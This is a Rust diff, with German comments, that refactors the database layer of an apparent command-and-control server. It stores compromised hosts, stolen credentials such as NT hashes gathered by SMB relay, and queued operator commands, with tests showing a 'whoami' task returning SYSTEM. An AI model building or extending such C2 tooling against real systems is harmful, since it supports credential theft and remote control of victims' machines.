@@ -16,7 +16,7 @@ use rusqlite::{params, Connection};
 
 /// Zeile der `hosts`-Tabelle.
 #[derive(Debug, Clone)]
-pub struct HostRow {
+struct HostRow {
     pub id: String,
     pub ip: String,
     pub hostname: String,
@@ -30,7 +30,7 @@ pub struct HostRow {
 
 /// Zeile der `secrets`-Tabelle.
 #[derive(Debug, Clone)]
-pub struct SecretRow {
+struct SecretRow {
     pub id: String,
     pub host_id: String,
     pub cred_type: String,
@@ -52,7 +52,7 @@ pub struct SecretRow {
 
 /// Zeile der `tasks`-Tabelle.
 #[derive(Debug, Clone)]
-pub struct TaskRow {
+struct TaskRow {
     pub id: String,
     pub host_id: String,
     pub command: String,
@@ -136,7 +136,29 @@ impl Db {
     }
 
     /// Registriert einen Host (neu oder bestehend).
-    pub fn upsert_host(&self, h: &HostRow) -> Result<(), DbError> {
+    ///
+    /// Nimmt den Request des C2 Protocol entgegen und legt daraus die Zeile an.
+    /// Die Felder, die der Server erzeugt — Zeitstempel, Vorgabe-Status —
+    /// stehen hier, nicht im Handler: dort steht nur noch der Protokoll-Wert.
+    pub fn upsert_host(&self, req: &c2::RegisterRequest) -> Result<(), DbError> {
+        let now = kx_core::util::now_rfc3339();
+        let row = HostRow {
+            id: req.host_id.clone(),
+            ip: req.ip.clone(),
+            hostname: req.hostname.clone().unwrap_or_default(),
+            os: req.os.clone().unwrap_or_default(),
+            status: req
+                .status
+                .clone()
+                .unwrap_or_else(|| c2::STATUS_DISCOVERED.into()),
+            first_seen: now.clone(),
+            last_seen: now,
+            sealed_master: req.sealed_master.clone().unwrap_or_default(),
+        };
+        self.upsert_host_row(&row)
+    }
+
+    fn upsert_host_row(&self, h: &HostRow) -> Result<(), DbError> {
         self.conn.lock().unwrap().execute(
             "INSERT INTO hosts (id, ip, hostname, os, status, first_seen, last_seen, sealed_master)
              VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)
@@ -157,8 +179,29 @@ impl Db {
         Ok(())
     }
 
-    /// Liefert alle Hosts.
-    pub fn list_hosts(&self) -> Result<Vec<HostRow>, DbError> {
+    /// Aktualisiert den `last_seen`-Zeitstempel eines bekannten Hosts.
+    ///
+    /// Liefert `true`, wenn der Host existierte — der Agent kann daran
+    /// erkennen, ob sein Heartbeat zu einem registrierten Host gehoerte.
+    pub fn touch_host(&self, host_id: &str) -> Result<bool, DbError> {
+        let now = kx_core::util::now_rfc3339();
+        let changed = self.conn.lock().unwrap().execute(
+            "UPDATE hosts SET last_seen = ?2 WHERE id = ?1",
+            params![host_id, now],
+        )?;
+        Ok(changed > 0)
+    }
+
+    /// Liefert alle Hosts als C2-Protokoll.
+    pub fn list_hosts(&self) -> Result<Vec<c2::Host>, DbError> {
+        Ok(self
+            .list_host_rows()?
+            .iter()
+            .map(HostRow::to_contract)
+            .collect())
+    }
+
+    fn list_host_rows(&self) -> Result<Vec<HostRow>, DbError> {
         let conn = self.conn.lock().unwrap();
         let mut stmt = conn.prepare(
             "SELECT id, ip, hostname, os, status, first_seen, last_seen, sealed_master FROM hosts",
@@ -179,7 +222,35 @@ impl Db {
     }
 
     /// Speichert ein neues Secret.
-    pub fn insert_secret(&self, s: &SecretRow) -> Result<(), DbError> {
+    ///
+    /// Kommt das Secret versiegelt an, wird der Klartext verworfen — auf dem
+    /// C2 liegt die Beute dann nur noch verschluesselt. Ohne Siegel (Agent
+    /// ohne Server-Schluessel) bleibt der Klartext, sonst gaebe es nichts zu
+    /// entschluesseln.
+    ///
+    /// Diese Regel steht neben der Zeile, die sie betrifft, und nicht im
+    /// Handler: sie ist eine Eigenschaft der Ablage, nicht des HTTP.
+    pub fn insert_secret(&self, upload: &c2::SecretUpload) -> Result<(), DbError> {
+        let sealed_password = upload.sealed_password.clone().unwrap_or_default();
+        let password = if sealed_password.is_empty() {
+            upload.password.clone()
+        } else {
+            String::new()
+        };
+        let row = SecretRow {
+            id: uuid::Uuid::new_v4().to_string(),
+            host_id: upload.host_id.clone(),
+            cred_type: upload.cred_type.clone(),
+            username: upload.username.clone(),
+            password,
+            source: upload.source.clone().unwrap_or_default(),
+            collected_at: kx_core::util::now_rfc3339(),
+            versiegelt: sealed_password,
+        };
+        self.insert_secret_row(&row)
+    }
+
+    fn insert_secret_row(&self, s: &SecretRow) -> Result<(), DbError> {
         self.conn.lock().unwrap().execute(
             "INSERT INTO secrets (id, host_id, cred_type, username, password, source, collected_at, sealed_password)
              VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)",
@@ -197,8 +268,16 @@ impl Db {
         Ok(())
     }
 
-    /// Liefert alle Secrets.
-    pub fn list_secrets(&self) -> Result<Vec<SecretRow>, DbError> {
+    /// Liefert alle Secrets als C2-Protokoll.
+    pub fn list_secrets(&self) -> Result<Vec<c2::ExfiltratedSecret>, DbError> {
+        Ok(self
+            .list_secret_rows()?
+            .iter()
+            .map(SecretRow::to_contract)
+            .collect())
+    }
+
+    fn list_secret_rows(&self) -> Result<Vec<SecretRow>, DbError> {
         let conn = self.conn.lock().unwrap();
         let mut stmt = conn.prepare(
             "SELECT id, host_id, cred_type, username, password, source, collected_at, sealed_password FROM secrets",
@@ -219,7 +298,24 @@ impl Db {
     }
 
     /// Erzeugt einen Task.
-    pub fn insert_task(&self, t: &TaskRow) -> Result<(), DbError> {
+    ///
+    /// Nimmt den Request des C2 Protocol entgegen; die ID und der Zeitstempel
+    /// erzeugt der Server. Der angelegte Task wird zurückgeliefert — der
+    /// Operator braucht seine ID, um das Ergebnis später zuzuordnen.
+    pub fn insert_task(&self, req: &c2::CreateTaskRequest) -> Result<c2::Task, DbError> {
+        let row = TaskRow {
+            id: uuid::Uuid::new_v4().to_string(),
+            host_id: req.host_id.clone(),
+            command: req.command.clone(),
+            status: c2::STATUS_PENDING.into(),
+            result: String::new(),
+            created_at: kx_core::util::now_rfc3339(),
+        };
+        self.insert_task_row(&row)?;
+        Ok(row.to_contract())
+    }
+
+    fn insert_task_row(&self, t: &TaskRow) -> Result<(), DbError> {
         self.conn.lock().unwrap().execute(
             "INSERT INTO tasks (id, host_id, command, status, result, created_at)
              VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
@@ -250,8 +346,16 @@ impl Db {
         Ok(changed > 0)
     }
 
-    /// Liefert alle Tasks.
-    pub fn list_tasks(&self) -> Result<Vec<TaskRow>, DbError> {
+    /// Liefert alle Tasks als C2-Protokoll.
+    pub fn list_tasks(&self) -> Result<Vec<c2::Task>, DbError> {
+        Ok(self
+            .list_task_rows()?
+            .iter()
+            .map(TaskRow::to_contract)
+            .collect())
+    }
+
+    fn list_task_rows(&self) -> Result<Vec<TaskRow>, DbError> {
         let conn = self.conn.lock().unwrap();
         let mut stmt =
             conn.prepare("SELECT id, host_id, command, status, result, created_at FROM tasks")?;
@@ -270,46 +374,50 @@ impl Db {
 }
 
 /// Die Zeile nennt den Host `id`; im C2-Protokoll heißt dasselbe Feld `host_id`.
-impl From<HostRow> for c2::Host {
-    fn from(row: HostRow) -> Self {
+///
+/// Die Übersetzung liegt hier und nicht als `From`-Implikation: die Zeile ist
+/// ein Implementierungsdetail der Datenbank, und eine `From`-Implikation wäre
+/// ein öffentliches Versprechen, das ein privater Typ nicht geben kann.
+impl HostRow {
+    fn to_contract(&self) -> c2::Host {
         c2::Host {
-            host_id: row.id,
-            ip: row.ip,
-            hostname: row.hostname,
-            os: row.os,
-            status: row.status,
-            first_seen: row.first_seen,
-            last_seen: row.last_seen,
-            sealed_master: row.sealed_master,
+            host_id: self.id.clone(),
+            ip: self.ip.clone(),
+            hostname: self.hostname.clone(),
+            os: self.os.clone(),
+            status: self.status.clone(),
+            first_seen: self.first_seen.clone(),
+            last_seen: self.last_seen.clone(),
+            sealed_master: self.sealed_master.clone(),
         }
     }
 }
 
-impl From<SecretRow> for c2::ExfiltratedSecret {
-    fn from(row: SecretRow) -> Self {
+impl SecretRow {
+    fn to_contract(&self) -> c2::ExfiltratedSecret {
         c2::ExfiltratedSecret {
-            id: row.id,
-            host_id: row.host_id,
-            cred_type: row.cred_type,
-            username: row.username,
-            password: row.password,
-            source: row.source,
-            collected_at: row.collected_at,
+            id: self.id.clone(),
+            host_id: self.host_id.clone(),
+            cred_type: self.cred_type.clone(),
+            username: self.username.clone(),
+            password: self.password.clone(),
+            source: self.source.clone(),
+            collected_at: self.collected_at.clone(),
             sealed_password: String::new(),
         }
-        .mit_versiegeltem_passwort(row.versiegelt)
+        .mit_versiegeltem_passwort(self.versiegelt.clone())
     }
 }
 
-impl From<TaskRow> for c2::Task {
-    fn from(row: TaskRow) -> Self {
+impl TaskRow {
+    fn to_contract(&self) -> c2::Task {
         c2::Task {
-            id: row.id,
-            host_id: row.host_id,
-            command: row.command,
-            status: row.status,
-            result: row.result,
-            created_at: row.created_at,
+            id: self.id.clone(),
+            host_id: self.host_id.clone(),
+            command: self.command.clone(),
+            status: self.status.clone(),
+            result: self.result.clone(),
+            created_at: self.created_at.clone(),
         }
     }
 }
@@ -337,7 +445,7 @@ mod tests {
             last_seen: "2026-11-11T00:05:00Z".into(),
             sealed_master: String::new(),
         };
-        let wire = c2::Host::from(row);
+        let wire = row.to_contract();
         assert_eq!(wire.host_id, "10.0.0.5");
         assert_eq!(wire.status, c2::STATUS_COMPROMISED);
 
@@ -370,7 +478,7 @@ mod tests {
             result: "nt authority\\system".into(),
             created_at: "2026-11-11T00:06:00Z".into(),
         };
-        let json = serde_json::to_value(c2::Task::from(row)).expect("serialisierbar");
+        let json = serde_json::to_value(row.to_contract()).expect("serialisierbar");
         assert_eq!(json["result"], "nt authority\\system");
         assert!(json.get("output").is_none());
     }
@@ -382,25 +490,22 @@ mod tests {
         let dir = std::env::temp_dir();
         let path = dir.join(format!("kx-task-result-{}.db", uuid::Uuid::new_v4()));
         let db = Db::open(&path).expect("db");
-        db.insert_task(&TaskRow {
-            id: "t-1".into(),
-            host_id: "10.0.0.5".into(),
-            command: "whoami".into(),
-            status: c2::STATUS_PENDING.into(),
-            result: String::new(),
-            created_at: "2026-11-15T00:00:00Z".into(),
-        })
-        .expect("task angelegt");
+        let task = db
+            .insert_task(&c2::CreateTaskRequest {
+                host_id: "10.0.0.5".into(),
+                command: "whoami".into(),
+            })
+            .expect("task angelegt");
 
         let updated = db
-            .update_task_result("t-1", c2::STATUS_DONE, "nt authority\\system")
+            .update_task_result(&task.id, c2::STATUS_DONE, "nt authority\\system")
             .expect("Ergebnis geschrieben");
         assert!(updated, "der Task wurde nicht gefunden");
 
-        let rows = db.list_tasks().expect("tasks");
-        assert_eq!(rows.len(), 1);
-        assert_eq!(rows[0].status, c2::STATUS_DONE);
-        assert_eq!(rows[0].result, "nt authority\\system");
+        let tasks = db.list_tasks().expect("tasks");
+        assert_eq!(tasks.len(), 1);
+        assert_eq!(tasks[0].status, c2::STATUS_DONE);
+        assert_eq!(tasks[0].result, "nt authority\\system");
         std::fs::remove_file(&path).ok();
     }
 
@@ -434,7 +539,7 @@ mod tests {
             collected_at: "2026-11-11T00:05:00Z".into(),
             versiegelt: String::new(),
         };
-        let wire = c2::ExfiltratedSecret::from(row);
+        let wire = row.to_contract();
         assert_eq!(wire.host_id, "10.0.0.5");
         assert_eq!(wire.cred_type, "nt_hash");
         assert_eq!(wire.source, "smb_relay");
